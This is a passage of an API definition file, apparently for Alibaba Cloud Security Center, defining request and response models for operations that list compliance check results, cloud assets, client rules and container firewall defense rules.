*   **SLB**: Server Load Balancer (SLB)
*   **RDS**: ApsaraDB RDS
*   **MONGODB**: ApsaraDB for MongoDB (MongoDB)
*   **KVSTORE**: ApsaraDB for Redis (Redis)
*   **ACR**: Container Registry
*   **CSK**: Container Service for Kubernetes (ACK)
*   **VPC**: Virtual Private Cloud (VPC)
*   **ACTIONTRAIL**: ActionTrail
*   **CDN**: Alibaba Cloud CDN (CDN)
*   **CAS**: Certificate Management Service (formerly SSL Certificates Service)
*   **RDC**: Apsara Devops
*   **RAM**: Resource Access Management (RAM)
*   **DDOS**: Anti-DDoS
*   **WAF**: Web Application Firewall (WAF)
*   **OSS**: Object Storage Service (OSS)
*   **POLARDB**: PolarDB
*   **POSTGRESQL**: ApsaraDB RDS for PostgreSQL
*   **MSE**: Microservices Engine (MSE)
*   **NAS**: Apsara File Storage NAS (NAS)
*   **SDDP**: Sensitive Data Discovery and Protection (SDDP)
*   **EIP**: Elastic IP Address (EIP)', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries per page.', example='50', position='Query'),
  regionId?: string(name='RegionId', description='The region ID of the instance. Valid values:

*   **cn-hangzhou**: International
*   **ap-southeast-1**: Singapore', example='cn-hangzhou', position='Query'),
  requirementIds?: [ long ](name='RequirementIds', description='The IDs of requirement items.', position='Query'),
  riskLevels?: [ string ](name='RiskLevels', description='The risk levels of check items. Separate multiple risk levels with commas (,). Valid values:

*   **HIGH**
*   **MEDIUM**
*   **LOW**', position='Query'),
  sortTypes?: [ string ](name='SortTypes', description='The types of the conditions based on which check items are sorted. Valid values:

*   **RISK_LEVEL**: risk level
*   **STATUS**: status', position='Query'),
  standardIds?: [ long ](name='StandardIds', description='The IDs of standards.', position='Query'),
  statuses?: [ string ](name='Statuses', description='The statuses of check items. Separate multiple statuses with commas (,). Valid values:

*   **PASS**
*   **NOT_PASS**
*   **CHECKING**
*   **NOT_CHECK**
*   **WHITELIST**', position='Query'),
  types?: [ string ](name='Types', description='The types of check standards.', position='Query'),
  vendors?: [ string ](name='Vendors', description='The cloud service providers. Valid value:

*   **ALIYUN**: Alibaba Cloud', position='Query'),
}

model ListCheckResultResponseBody = {
  checks?: [ 
    {
      checkId?: long(name='CheckId', description='The ID of the check item.', example='5'),
      checkPolicies?: [ 
        {
          requirementId?: long(name='RequirementId', description='The requirement item ID of the check item.', example='2'),
          requirementShowName?: string(name='RequirementShowName', description='The display name of the requirement item of the check item.', example='Alibaba cloud OSS best security practices'),
          sectionId?: long(name='SectionId', description='The section ID of the check item.', example='3'),
          sectionShowName?: string(name='SectionShowName', description='The section display name of section of the check item.', example='Log Audit'),
          standardId?: long(name='StandardId', description='The standard ID of the check item.', example='1'),
          standardShowName?: string(name='StandardShowName', description='The standard display name of the check item.', example='Best security practices'),
        }
      ](name='CheckPolicies', description='The information about the check policies.'),
      checkShowName?: string(name='CheckShowName', description='The name of the check item.', example='OSS-PublicReadOpenManifestFileWithoutEncryption'),
      instanceSubType?: string(name='InstanceSubType', description='The asset subtype of the cloud service. Valid values:

*   If **InstanceType** is set to **ECS**, this parameter supports the following valid values:

    *   **INSTANCE**
    *   **DISK**
    *   **SECURITY_GROUP**

*   If **InstanceType** is set to **ACR**, this parameter supports the following valid values:

    *   **REPOSITORY_ENTERPRISE**
    *   **REPOSITORY_PERSON**

*   If **InstanceType** is set to **RAM**, this parameter supports the following valid values:

    *   **ALIAS**
    *   **USER**
    *   **POLICY**
    *   **GROUP**

*   If **InstanceType** is set to **WAF**, this parameter supports the following valid value:

    *   **DOMAIN**

*   If **InstanceType** is set to other values, this parameter supports the following valid value:

    *   **INSTANCE**', example='DISK'),
      instanceType?: string(name='InstanceType', description='The asset type of the cloud service. Valid values:

*   **ECS**: Elastic Compute Service (ECS)
*   **SLB**: Server Load Balancer (SLB)
*   **RDS**: ApsaraDB RDS
*   **MONGODB**: ApsaraDB for MongoDB (MongoDB)
*   **KVSTORE**: ApsaraDB for Redis
*   **ACR**: Container Registry
*   **CSK**: Container Service for Kubernetes (ACK)
*   **VPC**: Virtual Private Cloud (VPC)
*   **ACTIONTRAIL**: ActionTrail
*   **CDN**: Alibaba Cloud CDN (CDN)
*   **CAS**: Certificate Management Service
*   **RDC**: Apsara Devops
*   **RAM**: Resource Access Management (RAM)
*   **DDOS**: Anti-DDoS
*   **WAF**: Web Application Firewall (WAF)
*   **OSS**: Object Storage Service (OSS)
*   **POLARDB**: PolarDB
*   **POSTGRESQL**: ApsaraDB RDS for PostgreSQL
*   **MSE**: Microservices Engine (MSE)
*   **NAS**: Apsara File Storage NAS (NAS)
*   **SDDP**: Sensitive Data Discovery and Protection (SDDP)
*   **EIP**: Elastic IP Address (EIP)', example='ECS'),
      lastCheckTime?: long(name='LastCheckTime', description='The timestamp generated when the last check was performed. Unit: milliseconds.', example='1657793398000'),
      riskLevel?: string(name='RiskLevel', description='The risk level of the check item. Valid values:

*   **HIGH**
*   **MEDIUM**
*   **LOW**', example='HIGH'),
      status?: string(name='Status', description='The status of the check item. Valid values:

*   **PASS**
*   **NOT_PASS**
*   **CHECKING**
*   **NOT_CHECK**
*   **WHITELIST**', example='PASS'),
      statusMessage?: string(name='StatusMessage'),
      taskId?: string(name='TaskId', description='The ID of the check task.', example='64'),
      trialPermission?: boolean(name='TrialPermission', description='Indicates whether the TRIAL permission is required.', example='true'),
      vendor?: string(name='Vendor', description='The cloud service provider.', example='ALIYUN'),
      vendorShowName?: string(name='VendorShowName', description='The name of the cloud service provider.', example='Aliyun'),
    }
  ](name='Checks', description='The information about the check items.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='2'),
    currentPage?: int32(name='CurrentPage', description='The page number.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='100'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='F9B6DD67-B289-5406-B35C-B0F4A217S23'),
}

model ListCheckResultResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListCheckResultResponseBody(name='body'),
}

async function listCheckResult(request: ListCheckResultRequest): ListCheckResultResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ListCheckResult', 'POST', '/', 'json', false, 'json', request);
}

model ListCheckStandardRequest {
  instanceIds?: [ string ](name='InstanceIds', description='The instance IDs of the cloud services to which the check items belong.', position='Query'),
  instanceSubTypes?: [ string ](name='InstanceSubTypes', description='The subtypes of cloud services.', position='Query'),
  instanceTypes?: [ string ](name='InstanceTypes', description='The asset types of cloud services.', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  vendors?: [ string ](name='Vendors', description='The cloud service providers. Valid values:

*   **ALIYUN**: Alibaba Cloud', position='Query'),
}

model ListCheckStandardResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='FA91FBDA-***'),
  standards?: [ 
    {
      id?: long(name='Id', description='The ID of the check item.', example='1'),
      requirements?: [ 
        {
          id?: long(name='Id', description='The ID of the search condition.', example='11'),
          riskCheckCount?: long(name='RiskCheckCount', description='The number of check items queried by using the search condition.', example='10'),
          showName?: string(name='ShowName', description='The display name of the search condition.', example='RAM identity authentication'),
        }
      ](name='Requirements', description='An array that consists of search conditions.'),
      showName?: string(name='ShowName', description='The display name of the check item.', example='Identity and permission management'),
      type?: string(name='Type', description='The type of the check item.', example='IDENTITY_PERMISSION'),
    }
  ](name='Standards', description='An array that consists of the check items.'),
}

model ListCheckStandardResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListCheckStandardResponseBody(name='body'),
}

async function listCheckStandard(request: ListCheckStandardRequest): ListCheckStandardResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ListCheckStandard', 'POST', '/', 'json', false, 'json', request);
}

model ListClientAlertModeRequest {
  mode?: string(name='Mode', description='The protection mode. Valid values:

*   **strict**: The strict mode. False positives may be generated. We recommend that you enable this mode during major events.
*   **balance**: The balanced mode. More risks can be detected with less false positives in this mode.', example='strict', position='Query'),
}

model ListClientAlertModeResponseBody = {
  data?: {
    count?: int32(name='Count', description='The total number of entries returned.', example='5'),
    uuids?: [ string ](name='Uuids', description='The UUIDs of the assets.'),
  }(name='Data', description='The response parameters.'),
  requestId?: string(name='RequestId', description='The request ID.', example='A4EB8B1C-1DEC-5E18-BCD0-D1BBB3936FA7'),
}

model ListClientAlertModeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListClientAlertModeResponseBody(name='body'),
}

async function listClientAlertMode(request: ListClientAlertModeRequest): ListClientAlertModeResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ListClientAlertMode', 'GET', '/', 'json', false, 'json', request);
}

model ListClientUserDefineRuleTypesRequest {
}

model ListClientUserDefineRuleTypesResponseBody = {
  requestId?: string(name='RequestId', example='340D7FC4-D575-1661-8ACD-CFA7BE57****'),
  userDefineRuleTypes?: [ string ](name='UserDefineRuleTypes'),
}

model ListClientUserDefineRuleTypesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListClientUserDefineRuleTypesResponseBody(name='body'),
}

async function listClientUserDefineRuleTypes(request: ListClientUserDefineRuleTypesRequest): ListClientUserDefineRuleTypesResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ListClientUserDefineRuleTypes', 'POST', '/', 'json', false, 'json', request);
}

model ListClientUserDefineRulesRequest {
  currentPage: int32(name='CurrentPage', description='The number of the page to return.', example='1', position='Query'),
  name?: string(name='Name', description='The name of the rule.', example='Rule\\*\\*\\*\\*', position='Query'),
  pageSize: int32(name='PageSize', description='The number of entries to return on each page.', example='10', position='Query'),
  type?: [ int32 ](name='Type', description='The types of rules.', position='Query'),
}

model ListClientUserDefineRulesResponseBody = {
  pageInfo?: {
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='69'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='A4EB8B1C-1DEC-5E18-BCD0-D1BBB393***'),
  userDefineRuleList?: [ 
    {
      actionType?: int32(name='ActionType', description='The action of the rule. Valid values:

*   **0**: allow
*   **1**: block', example='0'),
      id?: long(name='Id', description='The ID of the rule.', example='200****'),
      name?: string(name='Name', description='The name of the rule.', example='Rule\\*\\*\\*\\*'),
      platform?: string(name='Platform', description='The type of the operating system. Valid values:

*   **windows**: Windows
*   **linux**: Linux
*   **all**: all types', example='linux'),
      switchId?: string(name='SwitchId', description='The switch ID of the rule.', example='USER-DEFINE-RULE-SWITCH-TYPE_200****'),
      type?: int32(name='Type', description='The type of the rule. Valid values:

*   **1**: Process hash
*   **2**: Command line
*   **3**: Process Network
*   **4**: File Read and Write
*   **5**: Operation on Registry
*   **6**: Dynamic-link Library Loading
*   **7**: File Renaming', example='1'),
    }
  ](name='UserDefineRuleList', description='An array that consists of the rules.'),
}

model ListClientUserDefineRulesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListClientUserDefineRulesResponseBody(name='body'),
}

async function listClientUserDefineRules(request: ListClientUserDefineRulesRequest): ListClientUserDefineRulesResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ListClientUserDefineRules', 'POST', '/', 'json', false, 'json', request);
}

model ListCloudAssetInstancesRequest {
  cloudAssetTypes?: [ 
    {
      assetSubType?: int32(name='AssetSubType', description='The subtype of the cloud asset.

You can call the [GetCloudAssetCriteria](~~GetCloudAssetCriteria~~) operation to query the subtypes of cloud assets from the AssetSubType response parameter.', example='0'),
      assetType?: int32(name='AssetType', description='The type of the cloud asset.

You can call the [GetCloudAssetCriteria](~~GetCloudAssetCriteria~~) operation to query the types of cloud assets from the AssetType response parameter.', example='18'),
      vendor?: int32(name='Vendor', example='0'),
    }
  ](name='CloudAssetTypes', description='The cloud assets.', position='Query'),
  criteria?: string(name='Criteria', description='The search conditions for assets. The value of this parameter is in the JSON format and contains the following fields:

*   **name**: the name of the search condition.

*   **value**: the value of the search condition.

*   **logicalExp**: the logical relation for multiple search conditions. Valid values:

    *   **OR**: The search conditions use a logical **OR**.
    *   **AND**: The search conditions use a logical **AND**.

> You can call the [GetCloudAssetCriteria](~~GetCloudAssetCriteria~~) operation to query supported search conditions.', example='[{\\"name\\":\\"internetIp\\",\\"value\\":\\"192.168\\",\\"logicalExp\\":\\"OR\\"}]', position='Query'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.', example='2', position='Query'),
  logicalExp?: string(name='LogicalExp', description='The logical relation for multiple search conditions. Valid values:

*   **OR**: The search conditions use a logical **OR**.
*   **AND**: The search conditions use a logical **AND**.', example='OR', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Maximum value: 100. Default value: 20.', example='20', maximum=100, position='Query'),
  regionId?: string(name='RegionId', description='The region ID of the instance.', example='cn-hangzhou', position='Query'),
}

model ListCloudAssetInstancesResponseBody = {
  instances?: [ 
    {
      alarmStatus?: string(name='AlarmStatus', description='Indicates whether alerts are generated for the cloud asset. Valid values:

*   **YES**
*   **NO**', example='NO'),
      assetSubType?: string(name='AssetSubType', description='The subtype of the cloud service. The subtype of the cloud asset. Valid values:

*   **0**: ECS

    *   **0**: instance
    *   **1**: disk (storage)
    *   **2**: security group

*   **1**: SLB

    *   **0**: SLB
    *   **1**: Application Load Balancer (ALB)

*   **3**: ApsaraDB RDS

    *   **0**: instance

*   **4**: ApsaraDB for MongoDB

    *   **0**: instance

*   **5**: ApsaraDB for Redis

    *   **0**: instance

*   **6**: Container Registry

    *   **1**: Enterprise Edition
    *   **2**: Personal Edition

*   **8**: ACK

    *   **0**: cluster

*   **9**: VPC

    *   **0**: NAT gateway
    *   **1**: EIP
    *   **2**: VPN
    *   **3**: FLOW_LOG

*   **11**: ActionTrail

    *   **0**: trail

*   **12**: Alibaba Cloud CDN

    *   **0**: instance

*   **13**: Certificate Management Service (formerly SSL Certificates Service)

    *   **0**: certificate

*   **14**: Apsara Devops

    *   **0**: organization

*   **16**: Anti-DDoS

    *   **0**: instance

*   **17**: WAF

    *   **0**: domain name

*   **18**: OSS

    *   **0**: bucket

*   **19**: PolarDB

    *   **0**: cluster

*   **20**: ApsaraDB RDS for PostgreSQL

    *   **0**: instance

*   **21**: MSE

    *   **0**: cluster

*   **22**: NAS

    *   **0**: file system

*   **23**: DSC

    *   **0**: instance

*   **24**: EIP

    *   **0**: Anycast EIP

*   **25**: IDaaS EIAM

    *   **0**: instance

*   **26**: PolarDB-X

    *   **0**: instance

*   **27**: Elasticsearch

    *   **0**: instance', example='0'),
      assetSubTypeName?: string(name='AssetSubTypeName', description='The subtype name of the cloud asset.', example='SECURITY_GROUP'),
      assetType?: int32(name='AssetType', description='The type of the cloud asset. Valid values:

*   **0**: Elastic Compute Service (ECS)
*   **1**: Server Load Balancer (SLB)
*   **3**: ApsaraDB RDS
*   **4**: ApsaraDB for MongoDB
*   **5**: ApsaraDB for Redis
*   **6**: Container Registry
*   **8**: Container Service for Kubernetes (ACK)
*   **9**: Virtual Private Cloud (VPC)
*   **11**: ActionTrail
*   **12**: Alibaba Cloud CDN
*   **13**: Certificate Management Service (formerly SSL Certificates Service)
*   **14**: Apsara Devops
*   **16**: Anti-DDoS
*   **17**: Web Application Firewall (WAF)
*   **18**: Object Storage Service (OSS)
*   **19**: PolarDB
*   **20**: ApsaraDB RDS for PostgreSQL
*   **21**: Microservices Engine (MSE)
*   **22**: Apsara File Storage NAS (NAS)
*   **23**: Data Security Center (DSC)
*   **24**: Elastic IP Address (EIP)
*   **25**: Identity as a Service (IDaaS) Employee Identity and Access Management (EIAM)
*   **26**: PolarDB-X
*   **27**: Elasticsearch', example='0'),
      assetTypeName?: string(name='AssetTypeName', description='The type name of the cloud asset.', example='ECS'),
      createdTime?: long(name='CreatedTime', description='The time when the instance was created.', example='1607365213000'),
      instanceId?: string(name='InstanceId', description='The instance ID of the cloud asset.', example='d-uf60vevzkztnflx7cny5'),
      instanceName?: string(name='InstanceName', description='The instance name of the cloud asset.', example='yztest-l***'),
      internetIp?: string(name='InternetIp', description='The public IP address of the cloud asset.', example='1.2.XX.XX'),
      regionId?: string(name='RegionId', description='The ID of the region to which the cloud asset belongs.', example='cn-hanghzou'),
      riskStatus?: string(name='RiskStatus', description='Indicates whether risks are detected on the cloud asset. Valid values:

*   **YES**
*   **NO**', example='NO'),
      securityInfo?: string(name='SecurityInfo', description='The security information about the cloud asset.', example='{"seriousNum":0,"appNum":0,"baselineMedium":0,"remindNum":0,"imageVulNntf":0,"cveNum":0,"vul":0,"uuid":"yuejia-test","emgNum":0,"weakPWNum":0,"imageMaliciousFileRemind":0,"imageBaselineMedium":0,"laterVulCount":0,"cmsNum":0,"imageMaliciousFileSerious":0,"agentlessMalicious":0,"suspNum":0,"imageBaselineHigh":0,"asapVulCount":0,"imageVulLater":0,"agentlessAll":0,"sysNum":0,"containerLater":0,"containerSuspicious":0,"imageBaselineNum":0,"newSuspicious":0,"nntfVulCount":0,"scaNum":0,"containerNntf":0,"health":0,"trojan":0,"suspicious":0,"imageMaliciousFileSuspicious":0,"containerRemind":0,"baselineLow":0,"imageVulAsap":0,"imageBaselineLow":0,"containerAsap":0,"agentlessBaseline":0,"agentlessVulSca":0,"agentlessVulCve":0,"containerSerious":0,"baselineHigh":0,"account":0,"baselineNum":5}'),
      vendor?: int32(name='Vendor', description='The service provider (SP) of the cloud asset. Valid values:

*   **0**: a cloud asset provided by Alibaba Cloud
*   **1**: a third-party cloud asset
*   **2**: a cloud asset in a data center
*   **3**, **4**, **5**, and **7**: other cloud asset
*   **8**: a lightweight cloud asset', example='0'),
    }
  ](name='Instances', description='The details of the cloud assets.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='20'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='2'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='100'),
    totalCount?: int32(name='TotalCount', description='The total number of cloud assets.', example='69'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='028CF634-5268-5660-9575-48C9ED6BF880'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model ListCloudAssetInstancesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListCloudAssetInstancesResponseBody(name='body'),
}

async function listCloudAssetInstances(request: ListCloudAssetInstancesRequest): ListCloudAssetInstancesResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ListCloudAssetInstances', 'POST', '/', 'json', false, 'json', request);
}

model ListCloudVendorRegionsRequest {
  lang?: string(name='Lang', description='The language of the content in the request and response messages. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='en', position='Query'),
  vendor?: string(name='Vendor', description='The service provider of cloud assets. Valid values:

*   **Tencent**, **HUAWEICLOUD**, **Azure**, and **AWS**: other service providers of cloud assets.', example='3', position='Query'),
}

model ListCloudVendorRegionsResponseBody = {
  code?: string(name='Code', description='The return code.', example='200'),
  count?: int32(name='Count', description='The total number of returned entries.', example='2'),
  data?: [ 
    {
      area?: string(name='Area', description='The area to which the region belongs. The valid values vary based on the value of the Vendor parameter.

*   Valid values if **Vendor** is set to Tencent:
*   **cn**: China
*   **southeast_asia**: Southeast Asia Pacific
*   **northeast_asia**: Northeast Asia Pacific
*   **southern_asia**: South Asia Pacific
*   **north_America**: North America
*   **south_America**: South America
*   **western_America**: Western United States
*   **eastern_America**: Eastern United States
*   **european**: Europe
*   Valid values if **Vendor** is set to HUAWEICLOUD:
*   **cn**: China
*   **africa**: Africa
*   **latin_america**: Latin America
*   **asia**: Asia Pacific
*   Valid values if **Vendor** is set to Azure:
*   **middle_east**: Middle East
*   **south_america**: South America
*   **canada**: Canada
*   **asia-pacific**: Asia Pacific
*   **europe**: Europe
*   **africa**: Africa
*   **us**: United States
*   **other**: other regions
*   Valid values if **Vendor** is set to AWS:
*   **cn**: China
*   **us**: United States
*   **eu**: Europe
*   **asia**: Asia Pacific
*   **south_america**: South America
*   **me**: Middle East
*   **ca**: Canada
*   **af**: Africa', example='cn'),
      disable?: int32(name='Disable', description='Indicates whether the region is configured as a synchronization region on another site. Valid values:

*   **0**: The region is not configured as a synchronization region on another site.
*   **1**: The region is configured as a synchronization region on another site.', example='1'),
      regionId?: string(name='RegionId', description='The region ID.', example='cn-hangzhou'),
      selected?: int32(name='Selected', description='Indicates whether the region is configured as a synchronization region on this site. Valid values:

*   **0**: The region is configured as a synchronization region on this site.
*   **1**: The region is configured as a synchronization region on this site.', example='0'),
    }
  ](name='Data', description='The regions that the service provider supports.'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  message?: string(name='Message', description='The error message returned.', example='successful'),
  requestId?: string(name='RequestId', description='The request ID.', example='C87EC6AD-4590-5546-9DF6-B8956579D***'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model ListCloudVendorRegionsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListCloudVendorRegionsResponseBody(name='body'),
}

async function listCloudVendorRegions(request: ListCloudVendorRegionsRequest): ListCloudVendorRegionsResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ListCloudVendorRegions', 'POST', '/', 'json', false, 'json', request);
}

model ListClusterCnnfStatusDetailRequest {
  clusterIds?: [ string ](name='ClusterIds', description='An array that consists of the ID of the cluster.', position='Query'),
}

model ListClusterCnnfStatusDetailResponseBody = {
  data?: [ 
    {
      clusterId?: string(name='ClusterId', description='The ID of the cluster.', example='c8ca91e0907d94efaba7fb0827eb9****'),
      installed?: boolean(name='Installed', description='Indicates whether the container firewall plug-in is installed.', example='true'),
      instanceId?: string(name='InstanceId', description='The ID of the server.', example='i-bp180bogui4fc0z4****'),
      internetIp?: string(name='InternetIp', description='The public IP address of the associated instance.', example='172.16.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the associated instance.', example='10.42.XX.XX'),
      invalidType?: string(name='InvalidType', description='The cause why the plug-in is invalid. Valid values:

*   **PLUGIN_OFFLINE**: The plug-in is offline.
*   **PLUGIN\\_NOT_INSTALLED**: The plug-in is not installed.
*   **PLUGIN\\_INVALID_VERSION**: The version of the plug-in is invalid.', example='PLUGIN_OFFLINE'),
      machineName?: string(name='MachineName', description='The name of the server.', example='security'),
      machineType?: int32(name='MachineType', description='The machine type of the instance. The value is fixed as **ecs**.', example='ecs'),
      pluginName?: string(name='PluginName', description='The name of the plug-in. The value is fixed as **alinet**.', example='alinet'),
      pluginVersion?: string(name='PluginVersion', description='The version of the plug-in.', example='3.3'),
      status?: string(name='Status', description='The online status of the plug-in. Valid values:

*   **false**: The plug-in is offline.
*   **true**: The plug-in is online.', example='false'),
      uuid?: string(name='Uuid', description='The UUID of the asset.', example='6690a46c-0edb-4663-a641-3629d1a9****'),
    }
  ](name='Data', description='An array that consists of the protection status of the container firewall.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='64329F40-5C94-51D3-A400-37AA7BAC****'),
}

model ListClusterCnnfStatusDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListClusterCnnfStatusDetailResponseBody(name='body'),
}

async function listClusterCnnfStatusDetail(request: ListClusterCnnfStatusDetailRequest): ListClusterCnnfStatusDetailResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ListClusterCnnfStatusDetail', 'POST', '/', 'json', false, 'json', request);
}

model ListClusterInterceptionConfigRequest {
  clusterCNNFStatus?: int32(name='ClusterCNNFStatus', description='The status of the container firewall feature. Valid values:

*   **-1**: unknown
*   **0**: abnormal
*   **1**: normal
*   **2**: normal to be confirmed', example='1', position='Query'),
  clusterId?: string(name='ClusterId', description='The ID of the cluster.

> You can call the [DescribeContainerInstances](~~DescribeContainerInstances~~) operation to query the IDs of clusters.', example='c22143730ab6e40b09ec7c1c51d4d****', position='Query'),
  clusterName?: string(name='ClusterName', description='The name of the cluster.', example='sas', position='Query'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: 1.', example='1', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20.', example='20', position='Query'),
}

model ListClusterInterceptionConfigResponseBody = {
  clusterConfigList?: [ 
    {
      clusterCNNFStatus?: int32(name='ClusterCNNFStatus', description='The status of the container firewall feature. Valid values:

*   **-1**: unknown
*   **0**: abnormal
*   **1**: normal
*   **2**: normal to be confirmed', example='0'),
      clusterId?: string(name='ClusterId', description='The ID of the cluster.', example='c9051d30d8a044b4d99e1cb5d25ac****'),
      clusterName?: string(name='ClusterName', description='The name of the cluster.', example='container-opa-kill-02'),
      clusterType?: string(name='ClusterType', description='The type of the cluster. Valid values:

*   **ManagedKubernetes**: managed Kubernetes cluster
*   **NotManagedKubernetes**: non-managed Kubernetes cluster
*   **PrivateKubernetes**: private cluster
*   **kubernetes**: dedicated Kubernetes cluster
*   **ask**: dedicated serverless Kubernetes (ASK) cluster', example='ManagedKubernetes'),
      interceptionSwitch?: int32(name='InterceptionSwitch', description='The status of the defense rule. Valid values:

*   **0**: disabled
*   **1**: enabled', example='1'),
      openRuleCount?: long(name='OpenRuleCount', description='The number of defense rules that are in effect.', example='12'),
      supportCNNF?: boolean(name='SupportCNNF', description='Indicates whether the container firewall feature is supported.', example='false'),
      totalRuleCount?: long(name='TotalRuleCount', description='The total number of defense rules.', example='123'),
    }
  ](name='ClusterConfigList', description='An array that consists of the configurations of the cluster.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='11'),
    currrentPage?: int32(name='CurrrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='11'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='49FDE92F-A0B8-56CC-B7A8-23B17646****'),
}

model ListClusterInterceptionConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListClusterInterceptionConfigResponseBody(name='body'),
}

async function listClusterInterceptionConfig(request: ListClusterInterceptionConfigRequest): ListClusterInterceptionConfigResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ListClusterInterceptionConfig', 'POST', '/', 'json', false, 'json', request);
}

model ListContainerDefenseRuleRequest {
  conditions?: [ 
    {
      type?: string(name='Type', description='The type of the condition. Valid values:

*   **ruleName: the name of the rule**', example='ruleName'),
      value?: string(name='Value', description='The value of the condition.', example='auto-test-rule-**'),
    }
  ](name='Conditions', description='The conditions.', position='Query'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1', position='Query'),
  isDefaultRule?: int32(name='IsDefaultRule', description='Specifies whether to query system rules.

>  This parameter is deprecated.', example='1', position='Query'),
  lang?: string(name='Lang', example='zh', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries per page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

>  We recommend that you do not leave this parameter empty.', example='20', position='Query'),
  ruleType?: int32(name='RuleType', example='1', position='Query'),
}

model ListContainerDefenseRuleResponseBody = {
  code?: string(name='Code', description='The response code. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code that is returned.', example='200'),
  list?: [ 
    {
      clusterCount?: int32(name='ClusterCount', description='The total number of clusters.', example='1'),
      clusterIdList?: string(name='ClusterIdList', description='The clusters specified in the rule.', example='cfb41a8**8a106'),
      description?: string(name='Description', description='The description of the rule.', example='defense rule.'),
      ruleAction?: int32(name='RuleAction', description='The action specified in the rule. Valid values:

*   **1**: alert
*   **2**: block', example='1'),
      ruleId?: long(name='RuleId', description='The ID of the rule.', example='181'),
      ruleName?: string(name='RuleName', description='The name of the rule.', example='test-rule-01'),
      ruleSwitch?: int32(name='RuleSwitch', description='The status of the rule. Valid values:

*   **1**: enabled
*   **0**: disabled', example='0'),
      ruleType?: int32(name='RuleType', description='The type of the rule. Valid values:

*   **1**: system rule
*   **2**: custom rule', example='1'),
    }
  ](name='List', description='The rules.'),
  message?: string(name='Message', description='The returned message.', example='successful'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='9'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    lastRowKey?: string(name='LastRowKey', description='The key of the last data entry.', example='CAESGgo***jE2NDc4NjE='),
    nextToken?: string(name='NextToken', description='The query credential.', example='B60***'),
    pageSize?: int32(name='PageSize', description='The number of entries per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='45'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The request ID.', example='5E3A63BA-***843'),
